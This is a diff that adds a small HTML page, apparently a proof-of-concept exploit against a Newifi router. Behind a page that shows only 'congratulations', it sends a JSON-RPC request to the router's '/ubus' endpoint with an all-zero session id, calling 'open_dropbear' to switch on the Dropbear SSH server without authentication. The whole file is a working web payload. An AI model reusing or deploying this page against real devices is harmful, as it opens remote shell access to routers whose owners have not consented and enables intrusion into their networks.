@@ -1,0 +1,28 @@
+:
+
+
+<html>
+	<head>
+	<script type="text/javascript" src="/newifi/jquery-1.9.1.js"></script>
+	</head>
+	<p>congratulations</p>
+	
+
+
+	<script type="text/javascript">
+	var url = "/ubus";
+	var data = "{'id': 1, 'jsonrpc': '2.0', 'method': 'call', 'params': ['00000000000000000000000000000000', 'xapi.basic', 'open_dropbear', {}]}";
+			$.ajax({
+				type: "POST",
+				url: url,
+				data: data,
+				success: function (data) {
+					document.write('success');
+				},
+				error:function(data) {
+					document.write('error');
+				}
+			});
+	</script>
+
+</html>
